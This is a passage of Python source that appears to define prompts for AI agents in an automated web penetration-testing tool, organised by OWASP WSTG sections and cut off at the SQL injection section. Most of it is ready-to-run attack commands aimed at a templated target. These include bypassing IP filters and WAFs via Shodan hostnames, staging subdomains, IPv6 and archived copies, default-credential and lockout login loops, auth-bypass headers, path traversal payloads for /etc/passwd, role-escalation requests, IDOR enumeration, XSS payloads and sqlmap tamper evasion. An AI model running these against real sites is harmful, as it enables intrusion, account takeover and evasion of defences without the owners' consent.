# [P4-A] Shodan — find platform hostnames for Host-header bypass (e.g. 1195745.cloudwaysapps.com)
# Platform vhosts have no IP filtering. Automatically tries each discovered hostname:
python3 -c "import subprocess,json; ip=subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=8).stdout.strip().splitlines(); ip=ip[0] if ip else ''; key='{_SHODAN_KEY}'; raw=subprocess.run(['curl','-4','-sk','--max-time','15','https://api.shodan.io/shodan/host/'+ip+'?key='+key],capture_output=True,text=True,timeout=20).stdout if (key and ip) else subprocess.run(['curl','-4','-sk','--max-time','10','https://internetdb.shodan.io/'+ip],capture_output=True,text=True,timeout=15).stdout if ip else ''; d=json.loads(raw) if raw and raw.strip().startswith('{{') else {{}}; hosts=d.get('hostnames',[]); ports=d.get('ports',[]); print('Shodan hostnames:',hosts); print('Shodan open ports:',ports); [print('BYPASS TARGET:',h) for h in hosts if '.' in h and h!=ip]; bypass=next((h for h in hosts if '.' in h and h!=ip and not h.startswith(ip)),None); bypass and print(subprocess.run(['curl','-L','-4','-sk','--max-time','15','-A','{_UA}','-H','Host: {{domain}}','-H','Referer: {_REF}','https://'+bypass+'/'],capture_output=True,text=True,timeout=20).stdout[:2000]) or print('[P4-A] No platform hostname found in Shodan — try manual check at shodan.io')"

# [P4-B] Staging/dev subdomains — often skip WAF/IP filtering (different server)
python3 -c "import subprocess; subs=['staging','dev','test','beta','direct','origin']; results=[(s,subprocess.run(['dig',s+'.{{domain}}','A','+short'],capture_output=True,text=True,timeout=5).stdout.strip().split('\n')[0]) for s in subs]; [print('ALT TARGET: https://'+s+'.{{domain}}','->',ip) for s,ip in results if ip]"
# For each discovered alternate IP, run:
curl -L -4 -sk --max-time 10 -A "{_UA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: {_REF}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt https://staging.{{domain}}/ 2>/dev/null | head -50
curl -L -4 -sI --max-time 10 -A "{_UA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt https://staging.{{domain}}/ 2>/dev/null

# [P4-C] IPv6 bypass (IP filters often only block IPv4 ranges)
dig {{domain}} AAAA +short 2>/dev/null | head -3
curl -6 -sk --max-time 10 -A "{_UA}" -H "Referer: {_REF}" https://{{domain}}/ 2>/dev/null | head -30 || echo "(IPv6 not available)"

# [P4-D] Wayback Machine cached copy (bypasses live IP filtering entirely)
curl -L -4 -s "https://web.archive.org/web/2/https://{{domain}}/" --max-time 15 -A "curl/7.88" 2>/dev/null | grep -iEo "(href|src|action)=['\"][^'\"#]+['\"]" | head -30 || echo "(no Wayback cache)"
curl -L -4 -s "https://webcache.googleusercontent.com/search?q=cache:{{domain}}" --max-time 12 -A "{_UA}" 2>/dev/null | head -50 || echo "(no Google cache)"

══════════════════════════════════════════════════════════
[INFO-02] Fingerprint Web Server
══════════════════════════════════════════════════════════

# nmap port scan — no -sV to avoid 90s timeout, use http-headers script for info
nmap -Pn -n --host-timeout 60s --script-timeout 15s -p 80,443 --script http-server-header,http-headers {{domain}} 2>/dev/null | head -40

══════════════════════════════════════════════════════════
[INFO-06] Application Entry Points
══════════════════════════════════════════════════════════

# robots.txt
curl -4 -s https://{{domain}}/robots.txt --max-time 10 -A "{_UA}" -H "Referer: {_REF}"

# sitemap — try both common filenames (robots.txt often tells you which)
curl -4 -s https://{{domain}}/sitemap.xml --max-time 10 -A "{_UA}" | grep -o '<loc>[^<]*' | head -20
curl -4 -s https://{{domain}}/sitemap_index.xml --max-time 10 -A "{_UA}" | grep -o '<loc>[^<]*' | head -20
curl -4 -s https://{{domain}}/sitemap.xml.gz --max-time 10 -A "{_UA}" -o /tmp/sm.gz 2>/dev/null && zcat /tmp/sm.gz 2>/dev/null | grep -o '<loc>[^<]*' | head -20 || true

# security.txt
curl -4 -s https://{{domain}}/.well-known/security.txt --max-time 8 -A "{_UA}"

# SPA detection + real entry point discovery
python3 -c "import subprocess,hashlib; get=lambda p: subprocess.run(['curl','-4','-sk','--max-time','8','--connect-timeout','5','-A','{_UA}','-H','Referer: {_REF}','https://{{domain}}'+p],capture_output=True,timeout=12).stdout; base=get('/'); h0=hashlib.md5(base).hexdigest() if base else ''; spa=sum(1 for p in ['/notexist-xyz-cfai-999','/xyz-bogus-cfai-888'] if base and hashlib.md5(get(p)).hexdigest()==h0); print('SPA=YES (same HTML for all paths — 200s are NOT real endpoints)' if spa>=2 else 'SPA=NO (server-side routing)'); code=lambda p: subprocess.run(['curl','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','6','--connect-timeout','4','-A','{_UA}','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); results=[(code(p),p) for p in ['/admin','/login','/wp-admin','/api','/dashboard','/register','/signup','/user','/backup','/config','/upload']]; [print(c,p) for c,p in results if c and c not in ('000','404','410')]"

# Directory brute-force
gobuster dir -u https://{{domain}} -w /usr/share/wordlists/dirb/common.txt -q -t 15 --timeout 8s -a "{_UA}" --no-error 2>/dev/null | head -30 || true

══════════════════════════════════════════════════════════
[INFO-07] Map Execution Paths + JS Bundle Analysis
══════════════════════════════════════════════════════════

# Full HTML fetch + framework detection (single-liner, no heredoc)
python3 -c "import subprocess,re; ua='{_UA}'; get=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','15','--connect-timeout','8','-A',ua,'-H','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','-H','Referer: {_REF}','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=20).stdout; html=get('https://{{domain}}/'); [print('LINK:',l) for l in sorted(set(re.findall(r'(?:href|src|action)=[\\x22\\x27]([^\\x22\\x27#]+)[\\x22\\x27]',html)))[:30]]; checks=[('React SPA','id=[\\x22\\x27]root[\\x22\\x27]'),('Vue SPA','id=[\\x22\\x27]app[\\x22\\x27]'),('Next.js','__NEXT_DATA__|/_next/'),('Nuxt.js','__NUXT__|/_nuxt/'),('WordPress','wp-content|wp-includes'),('Joomla','/com_'),('Drupal','Drupal[.]settings'),('Laravel','laravel_session'),('Django','csrfmiddlewaretoken'),('Rails','authenticity_token'),('Shopify','Shopify[.]shop|cdn[.]shopify'),('Webpack','webpackChunk|__webpack_require__'),('Bootstrap','bootstrap[.]min[.]css|bootstrap@'),('Tailwind','tailwindcss'),('jQuery','jquery[./-][0-9]'),('Angular','ng-version=|angular[.]js'),('Svelte','__svelte_|svelte@')]; [print('FRAMEWORK:',n) for n,p in checks if re.search(p,html,re.I)]; [print('BUNDLE:',p) for p in re.findall(r'src=[\\x22\\x27](/[^\\x22\\x27]+[.]js)[\\x22\\x27]',html)[:5]]"
# Fetch first JS bundle for secrets/routes (use URL from BUNDLE line above)
python3 -c "import subprocess,re; ua='{_UA}'; get=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,u],capture_output=True,text=True,timeout=15).stdout; html=get('https://{{domain}}/'); bundles=re.findall(r'src=[\\x22\\x27](/[^\\x22\\x27]+[.]js)[\\x22\\x27]',html)[:2]; [print('--- BUNDLE',p,'---'); print(get('https://{{domain}}'+p)[:500]) for p in bundles] or print('(no JS bundles found)')"

══════════════════════════════════════════════════════════
[INFO-08] Fingerprint Framework — Response Headers
══════════════════════════════════════════════════════════

curl -4 -sI https://{{domain}}/ --max-time 12 -A "{_UA}" -H "Referer: {_REF}" | grep -iE "server|x-powered-by|x-generator|x-drupal|x-wordpress|cf-ray|x-shopify|x-runtime|via|x-vercel|x-netlify|x-amz|set-cookie|content-type"

══════════════════════════════════════════════════════════
[INFO-09] Fingerprint Web Application
══════════════════════════════════════════════════════════

# meta generator tag
curl -4 -s https://{{domain}}/ --max-time 15 -A "{_UA}" -H "Referer: {_REF}" | grep -iEo "<meta[^>]+generator[^>]+>" | head -5

# API/GraphQL endpoint probe
for p in /api /graphql /api/v1 /api/v2 /v1 /v2 /rest /swagger.json /openapi.json /wp-json; do code=$(curl -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p --max-time 6 -A "{_UA}"); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"; done

══════════════════════════════════════════════════════════
[INFO-10] Map Application Architecture
══════════════════════════════════════════════════════════

# Port scan — no -sV so it finishes in <30s
nmap -Pn -n --host-timeout 60s -T4 -p 80,443,8080,8443,3000,4000,5000,9000 {{domain}} 2>/dev/null | head -20

# CDN/proxy header detection
curl -4 -sI https://{{domain}}/ --max-time 12 -A "{_UA}" | grep -iE "via|x-cache|cf-ray|x-amz|x-varnish|fastly|akamai|cloudflare|x-vercel|x-netlify|x-hcdn|platform|panel|age"

══════════════════════════════════════════════════════════
FINAL OUTPUT — format as this exact table structure:
══════════════════════════════════════════════════════════

| # | WSTG-ID  | Severity | Finding                          | Evidence                              |
|---|----------|----------|----------------------------------|---------------------------------------|
| 1 | INFO-02  | Info     | Server: nginx (Hostinger/hcdn)   | server: hcdn, platform: hostinger     |
| 2 | INFO-06  | Medium   | WordPress path exposed           | /wp-content/uploads/wpforms/          |
| 3 | INFO-08  | High     | Framework version leaked         | WordPress 6.x via meta generator      |

Severity guide (do NOT over-score):
- Info:     hosting provider, ASN/org, IP geolocation, registrar, SPF/MX, DNS, CDN detected
- Low:      open non-essential port, missing security header, banner without version
- Medium:   exposed CMS name, version string in header, directory listing, sensitive path accessible
- High:     specific exploitable version with known CVE, admin panel exposed, credentials leaked
- Critical: active RCE/SQLi/auth bypass confirmed

After completing all checks, produce the final report:
- **EXECUTIVE SUMMARY**: total findings count, highest severity, most critical issue in one sentence
- Detailed report blocks (per RULES) for each confirmed Medium/High/Critical finding
- Table rows for Info/Low informational findings
- **REMEDIATION PRIORITY**: top 3 fixes ordered by risk
""", max_turns=40)


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CONF  (CONF-01, 10)
# ─────────────────────────────────────────────────────────────────────────────
CONF_AGENT = _agent('CONF', 'Configuration & Deploy Management', f"""
You are the WSTG-CONF agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[CONF-01] Test Network Infrastructure Configuration
  nmap -Pn --script ssl-cert,ssl-enum-ciphers -p 443 {{domain}} 2>/dev/null | head -40
  curl -L -4 -sk https://{{domain}}/.well-known/security.txt -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|x-frame-options|x-content-type|content-security-policy|x-xss-protection"

[CONF-10] Test for Subdomain Takeover
  subfinder -d {{domain}} -silent 2>/dev/null | head -30 || echo "(subfinder not available)"
  python3 -c "import subprocess,json; raw=subprocess.run(['curl','-L','-4','-sk','--max-time','20','--connect-timeout','8','-A','curl/7.88','https://crt.sh/?q=%25.{{domain}}&output=json'],capture_output=True,text=True,timeout=25).stdout; d=json.loads(raw) if raw.strip().startswith('[') else []; subs=sorted(set(v.replace('*.','') for e in d for v in e.get('name_value','').split() if '{{domain}}' in v)); [print(s) for s in subs[:30]] or print('(no crt.sh results)')"
  amass enum -passive -d {{domain}} 2>/dev/null | head -20 || true

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-IDNT  (IDNT-01 to 05)
# ─────────────────────────────────────────────────────────────────────────────
IDNT_AGENT = _agent('IDNT', 'Identity Management', f"""
You are the WSTG-IDNT agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s and you get no output.

[IDNT-01] Test Role Definitions
  curl -L -4 -s https://{{domain}}/ --max-time 15 -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.9" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt | grep -iEo "(admin|moderator|editor|viewer|role|privilege|superuser|staff)" | sort -u
  for p in /admin /dashboard /moderator /staff /manager; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null); echo "$code $p"; done

[IDNT-02] Test User Registration Process
  for p in /register /signup /join /create-account /new-user; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null); echo "$code $p"; done
  curl -L -4 -si https://{{domain}}/register --max-time 12 -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null | grep -iE "email|username|password|confirm" | head -10

[IDNT-03] Test Account Provisioning
  curl -L -4 -si -X POST https://{{domain}}/register -d "username=cfai_test99&email=cfai_test99@mailinator.com&password=CfaiTest1234!" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | head -20

[IDNT-04] Account Enumeration
  for u in admin administrator root test user info support webmaster; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}/user/$u --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null); echo "$code /user/$u"; done
  curl -L -4 -si -X POST https://{{domain}}/login -d "username=admin@{{domain}}&password=wrongpass" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "user|exist|found|invalid|error" | head -5

[IDNT-05] Weak or Unenforced Username Policy
  python3 -c "import subprocess; ua='{_BUA}'; base=['curl','-L','-4','-si','-X','POST','https://{{domain}}/register','-H','Content-Type: application/x-www-form-urlencoded','-A',ua,'--max-time','10','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt']; users=['a','','user name','a@b','x'*300]; [print(subprocess.run(base+['-d',f'username={{u}}&email=t@t.com&password=Test1234!'],capture_output=True,text=True,timeout=15).stdout[:300]) for u in users]"

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-ATHN  (ATHN-01,02,03,04,07,08,09,10,11)
# ─────────────────────────────────────────────────────────────────────────────
ATHN_AGENT = _agent('ATHN', 'Authentication Testing', f"""
You are the WSTG-ATHN agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s and you get no output.

[ATHN-01] Credentials over Encrypted Channel
  code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" http://{{domain}}/login -A "{_BUA}" --max-time 12 2>/dev/null)
  loc=$(curl -L -4 -sI http://{{domain}}/login -A "{_BUA}" --max-time 12 2>/dev/null | grep -i location)
  echo "HTTP login: $code $loc"
  curl -L -4 -sI https://{{domain}}/login -A "{_BUA}" --max-time 12 2>/dev/null | grep -iE "strict-transport-security"

[ATHN-02] Default Credentials
  for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "admin:admin123" "administrator:administrator"; do
    u="${{cred%%:*}}"; p="${{cred##*:}}"
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST https://{{domain}}/login \
      -d "username=$u&password=$p" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null)
    echo "$code  $cred"
  done

[ATHN-03] Weak Lock Out Mechanism
  for i in $(seq 1 8); do
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST https://{{domain}}/login \
      -d "username=admin@{{domain}}&password=wrongpass$i" \
      -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null)
    echo "Attempt $i: HTTP $code"
  done

[ATHN-04] Bypassing Authentication Schema
  curl -L -4 -si https://{{domain}}/admin/ -H "X-Forwarded-For: 127.0.0.1" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | head -5
  curl -L -4 -si https://{{domain}}/admin -H "X-Original-URL: /" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | head -5
  curl -L -4 -si "https://{{domain}}/login?next=/admin&admin=true" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | head -5

[ATHN-07] Weak Password Policy
  for pass in "1" "123" "password" "abc" "1234567890123456789012345678901234567890"; do
    curl -L -4 -si -X POST https://{{domain}}/register \
      -d "username=poltest&email=pol@mailinator.com&password=$pass" \
      -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null \
      | grep -iE "password|weak|policy|error|invalid|length" | head -2
  done

[ATHN-08] Weak Security Question/Answer
  for p in /forgot-password /password-hint /security-question /recover; do
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"
  done

[ATHN-09] Weak Password Reset
  curl -L -4 -si -X POST https://{{domain}}/forgot-password \
    -d "email=admin@{{domain}}" \
    -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | head -20
  curl -L -4 -si -X POST https://{{domain}}/reset-password \
    -d "token=123456&password=newpass" \
    -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | head -10

[ATHN-10] Weaker Authentication in Alternative Channel
  for ep in /api/login /api/v1/login /api/v2/login /api/auth /mobile/login /m/login; do
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST https://{{domain}}$ep \
      -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt \
      -d '{{"username":"admin","password":"admin"}}' --max-time 10 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $ep"
  done

[ATHN-11] Multi-Factor Authentication
  curl -L -4 -s https://{{domain}}/login -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.9" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 18 2>/dev/null \
    | grep -iE "(2fa|mfa|otp|totp|authenticator|two.factor|verification.code|sms.code)" | head -5

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-ATHZ  (ATHZ-01 to 05)
# ─────────────────────────────────────────────────────────────────────────────
ATHZ_AGENT = _agent('ATHZ', 'Authorization Testing', f"""
You are the WSTG-ATHZ agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[ATHZ-01] Directory Traversal / File Include
  python3 -c "import subprocess; ua='{_BUA}'; payloads=['/../../../etc/passwd','/%2e%2e/%2e%2e/etc/passwd','/..%2f..%2fetc%2fpasswd','/?file=../../etc/passwd','/?path=../etc/passwd','/?page=../../../../etc/passwd']; [print('HIT PATH TRAVERSAL:' if any(x in b for x in ['root:x:0','root:!:','bin:x:1']) else 'OK ('+str(len(b))+' bytes)',p) for p in payloads for b in [subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'https://{{domain}}'+p],capture_output=True,text=True,timeout=12).stdout]]"

[ATHZ-02] Bypassing Authorization Schema
  for ep in /api/users /api/admin /admin/ /admin/dashboard; do curl -L -4 -si https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | head -5; echo "--- $ep ---"; done
  curl -L -4 -si https://{{domain}}/admin/ -H "X-Forwarded-For: 127.0.0.1" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | head -5

[ATHZ-03] Privilege Escalation
  curl -L -4 -si -X POST https://{{domain}}/api/user/update -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"role":"admin","is_admin":true,"privilege":"superuser"}}' --max-time 10 2>/dev/null | head -10
  curl -L -4 -si -X PUT https://{{domain}}/api/user/1 -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"role":"admin"}}' --max-time 10 2>/dev/null | head -10

[ATHZ-04] Insecure Direct Object Reference (IDOR)
  python3 -c "import subprocess; ua='{_BUA}'; paths=['/api/user/','/api/order/','/api/account/','/api/invoice/','/user/profile/','/order/','/account/']; ids=['1','2','3','100','9999']; [print(subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}} '+path+i,'-A',ua,'--max-time','6','https://{{domain}}'+path+i],capture_output=True,text=True,timeout=10).stdout.strip()) for path in paths for i in ids if subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','6','https://{{domain}}'+path+i],capture_output=True,text=True,timeout=10).stdout.strip() not in ('404','405','000','')]"

[ATHZ-05] OAuth Weaknesses
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iEo "(oauth|openid|auth0|okta|google.*login|facebook.*login|/.well-known/openid-configuration)" | sort -u
  for p in /.well-known/openid-configuration /oauth/authorize /oauth/token /auth/google /auth/facebook /auth/github; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"; done

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-SESS  (SESS-01,02,03,05,06,07,10)
# ─────────────────────────────────────────────────────────────────────────────
SESS_AGENT = _agent('SESS', 'Session Management Testing', f"""
You are the WSTG-SESS agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[SESS-01] Session Management Schema
  curl -L -4 -sc /tmp/cfai_sess.txt -so /dev/null https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" --max-time 12 2>/dev/null
  grep -v "^#\\|^$" /tmp/cfai_sess.txt 2>/dev/null || echo "No cookies"

[SESS-02] Cookie Attributes
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -i "set-cookie"
  curl -L -4 -sI https://{{domain}}/login -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -i "set-cookie"
  curl -L -4 -sI https://{{domain}}/account -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -i "set-cookie"

[SESS-03] Session Fixation
  curl -L -4 -sc /tmp/sess_pre.txt -so /dev/null https://{{domain}}/ -A "{_BUA}" --max-time 12 2>/dev/null
  grep -v "^#\\|^$" /tmp/sess_pre.txt 2>/dev/null | awk '{{print $NF}}' | head -3

[SESS-05] Cross Site Request Forgery (CSRF)
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(csrf|_token|authenticity_token|__RequestVerificationToken|X-CSRF)" | head -5
  curl -L -4 -s https://{{domain}}/login -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "csrf|_token|nonce" | head -5
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "samesite"

[SESS-06] Logout Functionality
  for p in /logout /signout /sign-out /api/logout /user/logout /account/logout; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "000" ] && echo "$code $p"; done

[SESS-07] Session Timeout
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "cache-control|pragma|expires|max-age"
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(session.timeout|idle.timeout|auto.logout|inactivity)" | head -5

[SESS-10] JSON Web Tokens (JWT)
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo "eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" | head -3
  for ep in /api /api/v1 /api/auth /api/token; do curl -L -4 -sI https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | grep -iE "authorization|bearer|jwt" | head -2; done

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-INPV  (INPV-01,02,05,11,12,18,19)
# ─────────────────────────────────────────────────────────────────────────────
INPV_AGENT = _agent('INPV', 'Input Validation Testing', f"""
You are the WSTG-INPV agent. Target: {{domain}}

CRITICAL: Use subprocess curl (NOT urllib — urllib stalls on VPS SSL). Every curl needs -L -4 -A "{_BUA}".

WAF BYPASS: If you get 403/429 responses, the target has a WAF. Before retrying:
1. Add random delays (time.sleep(1)) between requests
2. Use sqlmap tamper scripts: --tamper=between,randomcase,space2comment --delay=2 --random-agent
3. Try lowercase/mixed-case payloads: <ScRiPt>, SeLeCt instead of SELECT
4. Use URL encoding variants: %3cscript%3e, %27 OR %271%27=%271
5. Fragment payloads with comments: SE/**/LECT, <sc/**/ript>
6. After WAF bypass, VERIFY injections: a phpinfo() hit is ONLY confirmed if the response
   contains the actual PHP info table (PHP Version header row), NOT just the word 'phpinfo' echoed back.

[INPV-01] Reflected XSS
  # Payloads are URL-encoded to avoid shell quoting issues — unquote() decodes at runtime
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; enc=['%3cscript%3ealert(1)%3c%2fscript%3e','%22%27%3e%3cimg+src%3dx+onerror%3dalert(1)%3e','%3csvg+onload%3dalert(1)%3e']; payloads=[urllib.parse.unquote(p) for p in enc]; params=['q','search','s','query','keyword','name','input']; run=lambda u: (time.sleep(0.2) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout[:3000]); [print('REFLECTED XSS:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if pl in run(u)]"

[INPV-02] Stored XSS
  for ep in /comment /review /contact /feedback /post /message; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -d "comment=<script>alert(xss_test)</script>&name=tester&email=t@mailinator.com" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code POST $ep"; done

[INPV-05] SQL Injection
